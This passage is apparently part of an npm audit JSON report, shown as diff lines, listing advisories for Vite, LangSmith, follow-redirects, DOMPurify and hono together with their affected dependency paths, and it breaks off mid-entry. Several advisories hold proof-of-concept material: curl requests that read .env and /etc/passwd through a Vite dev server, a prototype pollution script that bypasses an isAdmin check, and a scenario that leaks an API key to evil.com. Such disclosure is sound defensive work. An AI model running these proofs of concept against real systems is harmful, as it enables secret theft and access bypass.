+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-v2wj-q39q-566r\n- https://github.com/vitejs/vite/pull/22160\n- https://github.com/vitejs/vite/commit/a9a3df299378d9cbc5f069e3536a369f8188c8ff\n- https://github.com/vitejs/vite/releases/tag/v7.3.2\n- https://github.com/vitejs/vite/releases/tag/v8.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39364\n- https://github.com/advisories/GHSA-v2wj-q39q-566r",
+      "created": "2026-04-06T18:03:32.000Z",
+      "id": 1116233,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe contents of files that are specified by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- the sensitive file exists in the allowed directories specified by [`server.fs.allow`](https://vite.dev/config/server-options#server-fs-allow)\n- the sensitive file is denied with a pattern that matches a file by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)\n\n### Details\n\nOn the Vite dev server, files that should be blocked by `server.fs.deny` (e.g., `.env`, `*.crt`) can be retrieved with HTTP 200 responses when query parameters such as `?raw`, `?import&raw`, or `?import&url&inline` are appended.\n\n### PoC\n\n1. Start the dev server: `pnpm exec vite root --host 127.0.0.1 --port 5175 --strictPort`\n2. Confirm that `server.fs.deny` is enforced (expect 403): `curl -i http://127.0.0.1:5175/src/.env | head -n 20`\n   <img width=\"3944\" height=\"1092\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ecb9f2e0-e08f-4ac7-b194-e0f988c4cd4f\" />\n3. Confirm that the same files can be retrieved with query parameters (expect 200):\n   <img width=\"2014\" height=\"373\" alt=\"image\" src=\"https://github.com/user-attachments/assets/76bc2a6a-44f4-4161-ae47-eab5ae0c04a8\" />",
+      "reported_by": null,
+      "title": "Vite: `server.fs.deny` bypassed with queries",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-39364"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.0.0 <=8.0.4",
+      "github_advisory_id": "GHSA-v2wj-q39q-566r",
+      "recommendation": "Upgrade to version 8.0.5 or later",
+      "patched_versions": ">=8.0.5",
+      "updated": "2026-04-07T22:16:19.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-180",
+        "CWE-284"
+      ],
+      "url": "https://github.com/advisories/GHSA-v2wj-q39q-566r"
+    },
+    "1116236": {
+      "findings": [
+        {
+          "version": "8.0.4",
+          "paths": [
+            ". > @stryker-mutator/vitest-runner@9.6.0 > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            ". > @stryker-mutator/vitest-runner@9.6.0 > vitest@4.1.2 > vite@8.0.4",
+            ". > @vitejs/plugin-react@6.0.1 > vite@8.0.4",
+            ". > @vitest/coverage-v8@4.1.2 > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            ". > @vitest/coverage-v8@4.1.2 > vitest@4.1.2 > vite@8.0.4",
+            ". > vite@8.0.4",
+            ". > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            ". > vitest@4.1.2 > vite@8.0.4",
+            "server > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            "server > vitest@4.1.2 > vite@8.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-p9ff-h696-f583\n- https://github.com/vitejs/vite/pull/22159\n- https://github.com/vitejs/vite/commit/f02d9fde0b195afe3ea2944414186962fbbe41e0\n- https://github.com/vitejs/vite/releases/tag/v6.4.2\n- https://github.com/vitejs/vite/releases/tag/v7.3.2\n- https://github.com/vitejs/vite/releases/tag/v8.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39363\n- https://github.com/advisories/GHSA-p9ff-h696-f583",
+      "created": "2026-04-06T18:03:24.000Z",
+      "id": 1116236,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n[`server.fs`](https://vite.dev/config/server-options#server-fs-strict) check was not enforced to the `fetchModule` method that is exposed in Vite dev server's WebSocket. \n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- WebSocket is not disabled by `server.ws: false`\n\nArbitrary files on the server (development machine, CI environment, container, etc.) can be exposed.\n\n### Details\n\nIf it is possible to connect to the Vite dev server’s WebSocket **without an `Origin` header**, an attacker can invoke `fetchModule` via the custom WebSocket event `vite:invoke` and combine `file://...` with `?raw` (or `?inline`) to retrieve the contents of arbitrary files on the server as a JavaScript string (e.g., `export default \"...\"`).\n\nThe access control enforced in the HTTP request path (such as `server.fs.allow`) is not applied to this WebSocket-based execution path.\n\n### PoC\n\n1. Start the dev server on the target \n   Example (used during validation with this repository):\n   ```bash\n   pnpm -C playground/alias exec vite --host 0.0.0.0 --port 5173\n   ```\n\n2. Confirm that access is blocked via the HTTP path (example: arbitrary file)\n   ```bash\n   curl -i 'http://localhost:5173/@fs/etc/passwd?raw'\n   ```\n   Result: `403 Restricted` (outside the allow list)\n   <img width=\"3898\" height=\"1014\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f6593377-549c-45d7-b562-5c19833438af\" />\n\n3. Confirm that the same file can be retrieved via the WebSocket path\n   By connecting to the HMR WebSocket without an `Origin` header and sending a `vite:invoke` request that calls `fetchModule` with a `file://...` URL and `?raw`, the file contents are returned as a JavaScript module.\n  <img width=\"1049\" height=\"296\" alt=\"image\" src=\"https://github.com/user-attachments/assets/af969f7b-d34e-4af4-8adb-5e2b83b31972\" />\n  <img width=\"1382\" height=\"955\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6a230d2e-197a-4c9c-b373-d0129756d5d7\" />",
+      "reported_by": null,
+      "title": "Vite Vulnerable to Arbitrary File Read via Vite Dev Server WebSocket",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-39363"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.0.0 <=8.0.4",
+      "github_advisory_id": "GHSA-p9ff-h696-f583",
+      "recommendation": "Upgrade to version 8.0.5 or later",
+      "patched_versions": ">=8.0.5",
+      "updated": "2026-04-07T22:16:11.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-200",
+        "CWE-306"
+      ],
+      "url": "https://github.com/advisories/GHSA-p9ff-h696-f583"
+    },
+    "1116472": {
+      "findings": [
+        {
+          "version": "0.5.16",
+          "paths": [
+            ". > @langchain/anthropic@1.3.26 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/openai@1.4.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/textsplitters@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/openai@1.4.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > langsmith@0.5.16",
+            ". > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/google-genai@2.1.26 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/groq@1.2.0 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph@1.2.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph@1.2.8 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph@1.2.8 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/openai@1.4.4 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/anthropic@1.3.26 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/openai@1.4.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/textsplitters@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/openai@1.4.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > langsmith@0.5.16",
+            "server > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/google-genai@2.1.26 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/groq@1.2.0 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph@1.2.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph@1.2.8 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph@1.2.8 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/openai@1.4.4 > @langchain/core@1.1.39 > langsmith@0.5.16"
+          ]
+        },
+        {
+          "version": "0.4.12",
+          "paths": [
+            ". > @langchain/langgraph-cli@1.1.17 > langsmith@0.4.12",
+            "server > @langchain/langgraph-cli@1.1.17 > langsmith@0.4.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-fw9q-39r9-c252\n- https://github.com/langchain-ai/langsmith-sdk/pull/2690\n- https://github.com/langchain-ai/langsmith-sdk/commit/31d3c3aec02892f4312baae112f817d6b2f0ebe3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-40190\n- https://github.com/advisories/GHSA-fw9q-39r9-c252",
+      "created": "2026-04-10T20:18:02.000Z",
+      "id": 1116472,
+      "npm_advisory_id": null,
+      "overview": "# GHSA-fw9q-39r9-c252: Prototype Pollution via Incomplete Lodash `set()` Guard in `langsmith-sdk`\n\n**Severity:** Medium (CVSS ~5.6)\n**Status:** Fixed in 0.5.18\n\n---\n\n## Summary\n\nThe LangSmith JavaScript/TypeScript SDK (`langsmith`) contains an incomplete prototype pollution fix in its internally vendored lodash `set()` utility. The `baseAssignValue()` function only guards against the `__proto__` key, but fails to prevent traversal via `constructor.prototype`. This allows an attacker who controls keys in data processed by the `createAnonymizer()` API to pollute `Object.prototype`, affecting all objects in the Node.js process.\n\n---\n\n## Affected Products\n\n| Product | Affected Versions | Component |\n|---------|-------------------|-----------|\n| `langsmith` (npm) | <= 0.5.17 | `js/src/utils/lodash/baseAssignValue.ts`, `js/src/anonymizer/index.ts` |\n| langchain-ai/langsmith-sdk | GitHub main branch (as of 2026-03-24) | JS/TypeScript SDK |\n\n**Not affected:** The Python SDK (`langsmith` on PyPI) does not use lodash or an equivalent pattern.\n\n---\n\n## Root Cause\n\nThe SDK vendors an internal copy of lodash's `set()` function at `js/src/utils/lodash/`. The `baseAssignValue()` function at `baseAssignValue.ts:11` implements a guard for prototype pollution:\n\n```typescript\nfunction baseAssignValue(object: Record<string, any>, key: string, value: any) {\n  if (key === \"__proto__\") {\n    Object.defineProperty(object, key, {\n      configurable: true, enumerable: true, value: value, writable: true,\n    });\n  } else {\n    object[key] = value;  // ← No guard for \"constructor\" or \"prototype\" keys\n  }\n}\n```\n\nThis blocks `__proto__` pollution but does **not** block the `constructor.prototype` traversal path. When `set()` is called with a path like `\"constructor.prototype.polluted\"`:\n\n1. `castPath()` splits it into `[\"constructor\", \"prototype\", \"polluted\"]`\n2. `baseSet()` iterates: `obj.constructor` → `Object` → `Object.prototype`\n3. `assignValue(Object.prototype, \"polluted\", value)` calls `baseAssignValue()`\n4. Key is `\"polluted\"` (not `\"__proto__\"`), so the guard is bypassed\n5. `Object.prototype.polluted = value` — all objects are polluted\n\n---\n\n## Attack Vector via Anonymizer\n\nThe `createAnonymizer()` API (importable as `langsmith/anonymizer`) processes data by:\n\n1. **Extracting string nodes** — `extractStringNodes()` walks an object recursively and builds dotted paths from keys\n2. **Applying regex replacements** — If a string value matches a configured pattern, the node is marked for update (`anonymizer/index.ts:95`)\n3. **Writing back with `set()`** — `set(mutateValue, node.path, node.value)` writes the replaced value back (`anonymizer/index.ts:123`)\n\nAn attacker who controls keys in data being anonymized can construct a nested object where the path resolves to `constructor.prototype.X`:\n\n```javascript\n{\n  wrapper: {\n    \"constructor.prototype.isAdmin\": \"contains-secret-pattern\"\n  }\n}\n```\n\n`extractStringNodes()` produces path `\"wrapper.constructor.prototype.isAdmin\"`. When the replacement triggers and `set()` writes back, it traverses up to `Object.prototype`.\n\nAlthough `createAnonymizer()` uses `deepClone()` at `anonymizer/index.ts:62` (`JSON.parse(JSON.stringify(data))`), the prototype chain traversal escapes the clone boundary because `clone.wrapper.constructor` resolves to the global `Object` constructor, not a cloned copy.\n\n---\n\n## Proof of Concept\n\n```javascript\nimport { createAnonymizer } from \"langsmith/anonymizer\";\n\nconst anonymizer = createAnonymizer([\n  { pattern: \"secret\", replace: \"[REDACTED]\" }\n]);\n\nconsole.log(\"BEFORE:\", ({}).isAdmin);  // undefined\n\nconst maliciousInput = {\n  wrapper: {\n    \"constructor.prototype.isAdmin\": \"this-is-secret-data\"\n  }\n};\n\nanonymizer(maliciousInput);\n\nconsole.log(\"AFTER:\", ({}).isAdmin);   // \"this-is-[REDACTED]-data\"\nconsole.log(\"Array:\", [].isAdmin);     // \"this-is-[REDACTED]-data\"\n\nfunction checkAccess(user) {\n  if (user.isAdmin) return \"ACCESS GRANTED\";\n  return \"ACCESS DENIED\";\n}\nconsole.log(checkAccess({ name: \"bob\" }));  // \"ACCESS GRANTED\" ← BYPASSED\n```\n\n---\n\n## Impact\n\nPrototype pollution in a Node.js process can enable:\n\n1. **Authentication bypass** — `if (user.isAdmin)` checks succeed on all objects\n2. **Remote Code Execution** — Exploitable in template engines (Pug, EJS, Handlebars, Nunjucks) via polluted prototype properties that reach `eval()`/`Function()` sinks\n3. **Denial of Service** — Overwriting `toString`, `valueOf`, or `hasOwnProperty` on all objects\n4. **Data exfiltration** — Polluting serialization methods to inject attacker-controlled values\n\n---\n\n## Remediation\n\nIn `baseAssignValue.ts`, extend the guard to cover `constructor` and `prototype` keys:\n\n```typescript\nfunction baseAssignValue(object, key, value) {\n  if (key === \"__proto__\" || key === \"constructor\" || key === \"prototype\") {\n    Object.defineProperty(object, key, {\n      configurable: true, enumerable: true, value, writable: true,\n    });\n  } else {\n    object[key] = value;\n  }\n}\n```\n\nAs defense in depth, `extractStringNodes()` in `anonymizer/index.ts` should also sanitize or reject path segments matching `constructor` or `prototype` before passing them to `set()`.\n\n---\n\n## Timeline\n\n| Date | Event |\n|------|-------|\n| 2026-03-24 | Initial report submitted |\n| 2026-04-09 | Vendor confirmed; fixed in 0.5.18 |\n\n---\n\n## Credits\n\nReported by: OneThing4101",
+      "reported_by": null,
+      "title": "LangSmith Client SDKs has Prototype Pollution in langsmith-sdk via Incomplete `__proto__` Guard in Internal lodash `set()`",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-40190"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "langsmith",
+      "vulnerable_versions": "<=0.5.17",
+      "github_advisory_id": "GHSA-fw9q-39r9-c252",
+      "recommendation": "Upgrade to version 0.5.18 or later",
+      "patched_versions": ">=0.5.18",
+      "updated": "2026-04-10T21:37:38.000Z",
+      "cvss": {
+        "score": 5.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-fw9q-39r9-c252"
+    },
+    "1116560": {
+      "findings": [
+        {
+          "version": "1.15.11",
+          "paths": [
+            ". > @langchain/community@1.1.27 > @ibm-cloud/watsonx-ai@1.7.10 > ibm-cloud-sdk-core@5.4.9 > axios@1.15.0 > follow-redirects@1.15.11",
+            ". > @langchain/community@1.1.27 > @ibm-cloud/watsonx-ai@1.7.10 > ibm-cloud-sdk-core@5.4.9 > retry-axios@2.6.0 > axios@1.15.0 > follow-redirects@1.15.11",
+            ". > @langchain/community@1.1.27 > ibm-cloud-sdk-core@5.4.9 > axios@1.15.0 > follow-redirects@1.15.11",
+            ". > @langchain/community@1.1.27 > ibm-cloud-sdk-core@5.4.9 > retry-axios@2.6.0 > axios@1.15.0 > follow-redirects@1.15.11",
+            "server > @langchain/community@1.1.27 > @ibm-cloud/watsonx-ai@1.7.10 > ibm-cloud-sdk-core@5.4.9 > axios@1.15.0 > follow-redirects@1.15.11",
+            "server > @langchain/community@1.1.27 > @ibm-cloud/watsonx-ai@1.7.10 > ibm-cloud-sdk-core@5.4.9 > retry-axios@2.6.0 > axios@1.15.0 > follow-redirects@1.15.11",
+            "server > @langchain/community@1.1.27 > ibm-cloud-sdk-core@5.4.9 > axios@1.15.0 > follow-redirects@1.15.11",
+            "server > @langchain/community@1.1.27 > ibm-cloud-sdk-core@5.4.9 > retry-axios@2.6.0 > axios@1.15.0 > follow-redirects@1.15.11"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653\n- https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9\n- https://github.com/advisories/GHSA-r4q5-vmmm-2653",
+      "created": "2026-04-14T01:11:11.000Z",
+      "id": 1116560,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nWhen an HTTP request follows a cross-domain redirect (301/302/307/308), `follow-redirects` only strips `authorization`, `proxy-authorization`, and `cookie` headers (matched by regex at index.js:469-476). Any custom authentication header (e.g., `X-API-Key`, `X-Auth-Token`, `Api-Key`, `Token`) is forwarded verbatim to the redirect target.\n\nSince `follow-redirects` is the redirect-handling dependency for **axios** (105K+ stars), this vulnerability affects the entire axios ecosystem.\n\n## Affected Code\n\n`index.js`, lines 469-476:\n\n```javascript\nif (redirectUrl.protocol !== currentUrlParts.protocol &&\n   redirectUrl.protocol !== \"https:\" ||\n   redirectUrl.host !== currentHost &&\n   !isSubdomain(redirectUrl.host, currentHost)) {\n  removeMatchingHeaders(/^(?:(?:proxy-)?authorization|cookie)$/i, this._options.headers);\n}\n```\n\nThe regex only matches `authorization`, `proxy-authorization`, and `cookie`. Custom headers like `X-API-Key` are not matched.\n\n## Attack Scenario\n\n1. App uses axios with custom auth header: `headers: { 'X-API-Key': 'sk-live-secret123' }`\n2. Server returns `302 Location: https://evil.com/steal`\n3. follow-redirects sends `X-API-Key: sk-live-secret123` to `evil.com`\n4. Attacker captures the API key\n\n## Impact\n\nAny custom auth header set via axios leaks on cross-domain redirect. Extremely common pattern. Affects all axios users in Node.js.\n\n## Suggested Fix\n\nAdd a `sensitiveHeaders` option that users can extend, or strip ALL non-standard headers on cross-domain redirect.\n\n## Disclosure\n\nSource code review, manually verified. Found 2026-03-20.",
+      "reported_by": null,
+      "title": "follow-redirects leaks Custom Authentication Headers to Cross-Domain Redirect Targets",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "follow-redirects",
+      "vulnerable_versions": "<=1.15.11",
+      "github_advisory_id": "GHSA-r4q5-vmmm-2653",
+      "recommendation": "Upgrade to version 1.16.0 or later",
+      "patched_versions": ">=1.16.0",
+      "updated": "2026-04-14T01:11:12.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-r4q5-vmmm-2653"
+    },
+    "1116663": {
+      "findings": [
+        {
+          "version": "3.3.3",
+          "paths": [
+            ". > dompurify@3.3.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-39q2-94rc-95cp\n- https://github.com/advisories/GHSA-39q2-94rc-95cp",
+      "created": "2026-04-16T00:46:35.000Z",
+      "id": 1116663,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nIn `src/purify.ts:1117-1123`, `ADD_TAGS` as a function (via `EXTRA_ELEMENT_HANDLING.tagCheck`) bypasses `FORBID_TAGS` due to short-circuit evaluation.\n\nThe condition:\n```\n!(tagCheck(tagName)) && (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])\n```\nWhen `tagCheck(tagName)` returns `true`, the entire condition is `false` and the element is kept — `FORBID_TAGS[tagName]` is never evaluated.\n\n## Inconsistency\nThis contradicts the attribute-side pattern at line 1214 where `FORBID_ATTR` explicitly wins first:\n```\nif (FORBID_ATTR[lcName]) { continue; }\n```\nFor tags, FORBID should also take precedence over ADD.\n\n## Impact\nApplications using both `ADD_TAGS` as a function and `FORBID_TAGS` simultaneously get unexpected behavior — forbidden tags are allowed through. Config-dependent but a genuine logic inconsistency.\n\n## Suggested Fix\nCheck `FORBID_TAGS` before `tagCheck`:\n```\nif (FORBID_TAGS[tagName]) { /* remove */ }\nelse if (tagCheck(tagName) || ALLOWED_TAGS[tagName]) { /* keep */ }\n```\n\n## Affected Version\nv3.3.3 (commit 883ac15)",
+      "reported_by": null,
+      "title": "DOMPurify's ADD_TAGS function form bypasses FORBID_TAGS due to short-circuit evaluation",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.3.3",
+      "github_advisory_id": "GHSA-39q2-94rc-95cp",
+      "recommendation": "Upgrade to version 3.4.0 or later",
+      "patched_versions": ">=3.4.0",
+      "updated": "2026-04-16T00:46:36.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-783"
+      ],
+      "url": "https://github.com/advisories/GHSA-39q2-94rc-95cp"
+    },
+    "1116669": {
+      "findings": [
+        {
+          "version": "4.12.12",
+          "paths": [
+            ". > @hono/node-server@1.19.14 > hono@4.12.12",
+            ". > @hono/zod-validator@0.7.6 > hono@4.12.12",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @hono/node-server@1.19.14 > hono@4.12.12",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @hono/zod-validator@0.7.6 > hono@4.12.12",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > hono@4.12.12",
+            ". > hono@4.12.12",
+            ". > shadcn@4.2.0 > @modelcontextprotocol/sdk@1.29.0 > @hono/node-server@1.19.14 > hono@4.12.12",
+            ". > shadcn@4.2.0 > @modelcontextprotocol/sdk@1.29.0 > hono@4.12.12",
+            "server > @hono/node-server@1.19.14 > hono@4.12.12",
+            "server > @hono/zod-validator@0.7.6 > hono@4.12.12",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @hono/node-server@1.19.14 > hono@4.12.12",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @hono/zod-validator@0.7.6 > hono@4.12.12",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > hono@4.12.12",
+            "server > hono@4.12.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-458j-xx4x-4375\n- https://github.com/advisories/GHSA-458j-xx4x-4375",
+      "created": "2026-04-16T01:02:24.000Z",
+      "id": 1116669,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nImproper handling of JSX attribute names in hono/jsx allows malformed attribute keys to corrupt the generated HTML output.\n\nWhen untrusted input is used as attribute keys during server-side rendering, specially crafted keys can break out of attribute or tag boundaries and inject unintended HTML.\n\n## Details\n\nWhen rendering JSX elements to HTML strings, attribute values are escaped, but attribute names (keys) were previously inserted into the output without validation.\n\nIf an attribute name contains characters such as `\"`, `>`, or whitespace, it can alter the structure of the generated HTML.\n\nFor example, malformed attribute names can:\n\n* Break out of the current attribute and introduce unintended additional attributes\n* Break out of the current HTML tag and inject new elements into the output\n\nThis issue arises when untrusted input (such as query parameters or form data) is used as JSX attribute keys during server-side rendering.\n\n## Impact\n\nAn attacker who can control attribute keys used in JSX rendering may inject unintended attributes or HTML elements into the generated output.\n\nThis may lead to:\n\n* Injection of unexpected HTML attributes\n* Corruption of the HTML structure\n* Potential cross-site scripting (XSS) if combined with unsafe usage patterns\n\nThis issue affects applications that pass untrusted input as JSX attribute keys during server-side rendering.",
+      "reported_by": null,
+      "title": "hono Improperly Handles JSX Attribute Names Allows HTML Injection in hono/jsx SSR",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.12.14",
+      "github_advisory_id": "GHSA-458j-xx4x-4375",
+      "recommendation": "Upgrade to version 4.12.14 or later",
+      "patched_versions": ">=4.12.14",
+      "updated": "2026-04-16T01:02:26.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-458j-xx4x-4375"
+    },
+    "1116670": {
+      "findings": [
+        {
+          "version": "0.5.16",
+          "paths": [
+            ". > @langchain/anthropic@1.3.26 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/openai@1.4.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/textsplitters@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > @langchain/openai@1.4.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/community@1.1.27 > langsmith@0.5.16",
+            ". > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/google-genai@2.1.26 > @langchain/core@1.1.39 > langsmith@0.5.16",
